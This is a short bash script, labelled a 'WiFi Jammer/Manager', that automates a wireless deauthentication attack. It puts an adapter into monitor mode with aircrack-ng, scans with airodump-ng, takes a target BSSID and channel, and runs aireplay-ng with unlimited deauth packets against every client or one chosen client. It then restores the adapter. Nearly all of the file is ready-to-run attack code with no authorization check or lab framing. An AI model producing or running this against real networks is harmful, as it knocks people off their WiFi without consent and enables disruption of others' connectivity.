#!/bin/bash
# Advanced WiFi Jammer/Manager for Linux/Arch
# Features: auto-detect adapters, monitor mode, scan, jam, restore, dependency check

set -e

# Dependency check
for cmd in airmon-ng aireplay-ng airodump-ng iw ip; do
    if ! command -v $cmd &>/dev/null; then
        echo "[!] $cmd is not installed. Please install aircrack-ng and iw."
        exit 1
    fi
done

# List WiFi adapters
adapters=($(iw dev | awk '/Interface/ {print $2}'))
if [ ${#adapters[@]} -eq 0 ]; then
    echo "[!] No WiFi adapters found."
    exit 1
fi

echo "Available WiFi adapters:"
for i in "${!adapters[@]}"; do
    echo "$i) ${adapters[$i]}"
done

read -p "Select adapter number: " idx
adapter="${adapters[$idx]}"

# Put adapter in monitor mode
sudo ip link set "$adapter" down
sudo airmon-ng check kill
sudo iw "$adapter" set monitor control || sudo airmon-ng start "$adapter"
sudo ip link set "$adapter" up

echo "[+] $adapter is now in monitor mode."

# Scan for networks
sudo airodump-ng "$adapter" &
scan_pid=$!
echo "Scanning for networks. Press Ctrl+C to stop and select a target."
trap 'kill $scan_pid 2>/dev/null' INT
wait $scan_pid

read -p "Enter target BSSID: " bssid
read -p "Enter target channel: " channel

# Set adapter to target channel
sudo airmon-ng start "$adapter" "$channel"

read -p "Do you want to start a deauth attack? (y/N): " deauth
if [[ "$deauth" =~ ^[Yy]$ ]]; then
    read -p "Enter client MAC (or leave blank for broadcast): " client
    if [ -z "$client" ]; then
        sudo aireplay-ng --deauth 0 -a "$bssid" "$adapter"
    else
        sudo aireplay-ng --deauth 0 -a "$bssid" -c "$client" "$adapter"
    fi
    echo "[+] Deauth attack running. Press Ctrl+C to stop."
fi

# Restore managed mode
sudo ip link set "$adapter" down
sudo iw "$adapter" set type managed || sudo airmon-ng stop "$adapter"
sudo ip link set "$adapter" up
sudo service NetworkManager restart || sudo systemctl restart NetworkManager

echo "[+] Adapter restored to managed mode. Exiting." 